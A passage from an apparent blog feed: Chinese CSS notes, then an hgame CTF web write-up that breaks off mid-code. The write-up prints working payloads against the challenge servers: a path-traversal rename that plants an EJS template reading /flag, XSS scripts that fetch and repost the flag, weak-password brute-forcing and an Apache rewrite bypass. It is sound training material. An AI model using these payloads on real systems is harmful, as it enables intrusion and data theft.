class="selector-tag">div</span>&gt;</span><br><span class="line">  &lt;<span class="selector-tag">div</span> class=&quot;box2&quot;&gt;&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">&lt;/<span class="selector-tag">div</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="div元素行内置"><a href="#div元素行内置" class="headerlink" title="div元素行内置"></a>div元素行内置</h2><p>​<img src="/img/CSS1/image-20250218103506-n2kwhki.png" alt="image">​</p><p>解决方法：</p><p>1.div元素写在一行</p><p>2.font-size:0px</p><p>3.word-spacing&lt;-20px即可</p><h2 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br></pre></td></tr></table></figure><h2 id="边框倒角"><a href="#边框倒角" class="headerlink" title="边框倒角"></a>边框倒角</h2><p>​<code>border-radius: 10px;</code>​</p><p>圆形图片：<code>border-radius: 50%;</code>​</p><h2 id="右下移动图片"><a href="#右下移动图片" class="headerlink" title="右下移动图片"></a>右下移动图片</h2><p>使用padding：会改变下一张图片的位置</p><p>正确方法：使用position:relative （相对定位）  top left… 遵循文档流的排列</p><h2 id="absolute"><a href="#absolute" class="headerlink" title="absolute"></a>absolute</h2><p>绝对定位 不为元素预留空间 变成第二个图层再做出相应改变</p><p>​<img src="/img/CSS1/image-20250218185201-4gbqja3.png" alt="image">​</p><h2 id="relative调位"><a href="#relative调位" class="headerlink" title="relative调位"></a>relative调位</h2><p>​<img src="/img/CSS1/image-20250218190303-0pce4sk.png" alt="image">​</p><p>注意的是把圆形放到右上角，需要做的是</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.select</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#bfbfbf</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">240px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">150px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图层优先级"><a href="#图层优先级" class="headerlink" title="图层优先级"></a>图层优先级</h2><p>​<img src="/img/CSS1/image-20250218190911-8ki56wa.png" alt="image">​</p><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><p>适用对象：一左一右&#x2F;文字环绕图片</p><h2 id="渐变颜色"><a href="#渐变颜色" class="headerlink" title="渐变颜色"></a>渐变颜色</h2><p>linear-gradient</p><p>例：background:linear-gradient(to right, #95ca47 30%, #4dc891 70%)</p><p>​<img src="/img/CSS1/image-20250218210349-u79f62a.png" alt="image">​</p><h2 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h2><p>background-image: url(图片地址)</p><p>注意：图片大小如果没有充满容器，图片会一直重复</p><p>需要用到background-repeat：no-repeat来禁止</p><pre><code>另外有：repeat（默认值）repeat-x/y（只在水平/垂直方向重复）</code></pre><p>背景图居中，用到background-position: center;</p><p>​<img src="/img/CSS1/image-20250218211113-t8qcwjj.png" alt="image">​</p><p>background-size</p><p>​<img src="/img/CSS1/image-20250218211257-ax7ym6e.png" alt="image">​</p><p>图片背景属性简写：<br><img src="/img/CSS1/image-20250218211521-96a8ag5.png" alt="image">​</p><h2 id="模态框"><a href="#模态框" class="headerlink" title="模态框"></a>模态框</h2><p>1.一直处于浏览界面中心</p><p>2.有一个半透明的背景</p><p>​<img src="/img/CSS1/image-20250218211913-bjd6u9a.png" alt="image">​</p><p>​<img src="/img/CSS1/image-20250218212040-18s9qzk.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame week1 web wp</title>
      <link href="/2025/02/12/hgame-week1/"/>
      <url>/2025/02/12/hgame-week1/</url>
      
        <content type="html"><![CDATA[<p>web1235，其余方向随缘解出几道(crypto3，re1，misc24)</p><p>只写了web，其他参考sean师傅的wp</p><p><a href="https://seandictionary.top/">Sean师傅的博客</a></p><p>week1排行在80左右浮动，还可以</p><h2 id="​Level-24-Pacman​"><a href="#​Level-24-Pacman​" class="headerlink" title="​Level 24 Pacman​"></a>​<code>Level 24 Pacman</code>​</h2><p>题目要求达到一万分，本来以为是抓包改分数，结果发现抓不到包</p><p>网上看了几个相关的题目学习了一下，发现是JS源码审计</p><p>在后台查找发现分数最后计算规则涉及的代码</p><p><img src="/img/hgame1/1905a7b75161eb8a39d436a39db6ca9a-20250211204837-qcw0xa5.png" alt="1905a7b75161eb8a39d436a39db6ca9a">​</p><p>在分数结算时设置断点即可修改分数</p><p>控制台输入_SCORE&#x3D;100000，直接改成十万分</p><p>​<img src="/img/hgame1/e0e7ad9a4d6df2fc8820e6c4df1dd60f-20250211205017-engbc46.png" alt="e0e7ad9a4d6df2fc8820e6c4df1dd60f">​</p><p>base64+栅栏密码即可</p><p>​<img src="/img/hgame1/700ca2ea5b9a3eaae339b8f32257ce5e-20250211205056-pbl0udl.png" alt="700ca2ea5b9a3eaae339b8f32257ce5e">​</p><p>（补）后来发现官方wp是直接在js源文件找的，我咋当时没找着，特意回去找了一下</p><p>​<img src="/img/hgame1/image-20250212003526-3hb3kvq.png" alt="image">​</p><p>666藏在中间了</p><h2 id="​Level-47-BandBomb​"><a href="#​Level-47-BandBomb​" class="headerlink" title="​Level 47 BandBomb​"></a>​<code>Level 47 BandBomb</code>​</h2><p>​<img src="/img/hgame1/image-20250211205259-7em88hk.png" alt="image">​</p><p>一上来就是一个文件上传页面，下意识认为是传马然后蚁剑连接，后来传了个一句话木马，连waf都没有，便觉得没那么简单</p><p>果然蚁剑连不上，那就看看附件有什么吧</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显要利用rename路径</p><p>上传一个文件1.ejs，内容为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure><p>然后burpsuite抓包，在rename目录下改文件名触发路径穿越</p><p>结合express框架的知识（app.js）可以知道要把文件放到views目录下</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /rename HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">Host<span class="punctuation">:</span> node2.hgame.vidar.club<span class="punctuation">:</span><span class="number">30389</span></span><br><span class="line"></span><br><span class="line">Cache<span class="punctuation">-</span>Control<span class="punctuation">:</span> max<span class="punctuation">-</span>age<span class="punctuation">=</span><span class="number">0</span></span><br><span class="line"></span><br><span class="line">Upgrade<span class="punctuation">-</span>Insecure<span class="punctuation">-</span>Requests<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">User<span class="punctuation">-</span>Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> <span class="punctuation">(</span>Windows NT <span class="number">10.0</span><span class="punctuation">;</span> Win64<span class="punctuation">;</span> x64<span class="punctuation">)</span> AppleWebKit/<span class="number">537.36</span> <span class="punctuation">(</span>KHTML<span class="punctuation">,</span> like Gecko<span class="punctuation">)</span> Chrome/<span class="number">125.0</span>.<span class="number">6422.112</span> Safari/<span class="number">537.36</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml<span class="punctuation">+</span>xml<span class="punctuation">,</span>application/xml<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>image/apng<span class="punctuation">,</span>*/*<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.8</span><span class="punctuation">,</span>application/signed<span class="punctuation">-</span>exchange<span class="punctuation">;</span>v<span class="punctuation">=</span>b3<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.7</span></span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">-</span>Encoding<span class="punctuation">:</span> gzip<span class="punctuation">,</span> deflate<span class="punctuation">,</span> br</span><br><span class="line"></span><br><span class="line">Accept<span class="punctuation">-</span>Language<span class="punctuation">:</span> zh<span class="punctuation">-</span>CN<span class="punctuation">,</span>zh<span class="punctuation">;</span>q<span class="punctuation">=</span><span class="number">0.9</span></span><br><span class="line"></span><br><span class="line">If<span class="punctuation">-</span>None<span class="punctuation">-</span>Match<span class="punctuation">:</span> W/<span class="string">&quot;1982-tCwmIaRF/b9+ySE9QjHMqwNikmo&quot;</span></span><br><span class="line"></span><br><span class="line">Connection<span class="punctuation">:</span> keep<span class="punctuation">-</span>alive</span><br><span class="line"></span><br><span class="line">Content<span class="punctuation">-</span>Type<span class="punctuation">:</span> application/json</span><br><span class="line"></span><br><span class="line">Content<span class="punctuation">-</span>Length<span class="punctuation">:</span> <span class="number">51</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;oldName&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.ejs&quot;</span><span class="punctuation">,</span><span class="string">&quot;newName&quot;</span><span class="punctuation">:</span><span class="string">&quot;../views/mortis.ejs&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>刷新页面，flag即渲染在页面上</p><p>​<img src="/img/hgame1/81836c77c6125b5b580d1ffacb6ba3ec-20250212020918-ro806bj.png" alt="81836c77c6125b5b580d1ffacb6ba3ec">​</p><h2 id="​Level-69-MysteryMessageBoard​"><a href="#​Level-69-MysteryMessageBoard​" class="headerlink" title="​Level 69 MysteryMessageBoard​"></a>​<code>Level 69 MysteryMessageBoard</code>​</h2><p>先搞个密码本，用bs弱口令爆破一下得到账号密码</p><p>shallot 888888</p><p>点进去发现是个留言板，那八成是个XSS了，试试最简单的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;111&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>确实有，并且好像连过滤都没有</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 直接从当前页面获取 flag</span></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> <span class="comment">// 确保发送 cookies</span></span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> response.<span class="title function_">text</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Failed to fetch flag&#x27;</span>);</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 将获取到的 flag 提交到留言板</span></span><br><span class="line">    <span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">    form.<span class="title function_">querySelector</span>(<span class="string">&#x27;textarea&#x27;</span>).<span class="property">value</span> = flag;</span><br><span class="line">    form.<span class="title function_">submit</span>();</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>另一种payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    fetch(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">        .then(res =&gt; res.text())</span><br><span class="line">        .then(flag =&gt; &#123;</span><br><span class="line">            fetch(<span class="string">&#x27;/&#x27;</span>, &#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                headers: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">                body: <span class="string">&quot;comment=&quot;</span> + flag</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后访问&#x2F;admin路径触发admin访问，再回到开始页面刷新即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;W0w_y0u_5r4_9o0d_4t_xss&#125;</span><br></pre></td></tr></table></figure><h2 id="Level-38475-角落​"><a href="#Level-38475-角落​" class="headerlink" title="Level 38475 角落​"></a><code>Level 38475 角落</code>​</h2><p>先用dirsearch扫一下，果然有东西，robots.txt，复习一下</p><p>​<img src="/img/hgame1/image-20250212025612-mdd5e7b.png" alt="image">​</p><p>找到app.conf，审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Include by httpd.conf</span></span><br><span class="line">&lt;Directory <span class="string">&quot;/usr/local/apache2/app&quot;</span>&gt;</span><br><span class="line">    Options Indexes</span><br><span class="line">    AllowOverride <span class="literal">None</span></span><br><span class="line">    Require <span class="built_in">all</span> granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files <span class="string">&quot;/usr/local/apache2/app/app.py&quot;</span>&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny <span class="keyword">from</span> <span class="built_in">all</span></span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond <span class="string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="string">&quot;^L1nk/&quot;</span></span><br><span class="line">RewriteRule <span class="string">&quot;^/admin/(.*)$&quot;</span> <span class="string">&quot;/$1.html?secret=todo&quot;</span></span><br><span class="line"></span><br><span class="line">ProxyPass <span class="string">&quot;/app/&quot;</span> <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br></pre></td></tr></table></figure><p>思路是改一下UR为L1nk&#x2F;，去访问&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py，但是一直失败</p><p>后来请教了一下学长，发现题号对应了一个漏洞CVE-2024-38745</p><p>改了一下url为&#x2F;admin&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;app&#x2F;app.py%3f，成功了</p><p>审计app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">    filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        message = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        status = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span 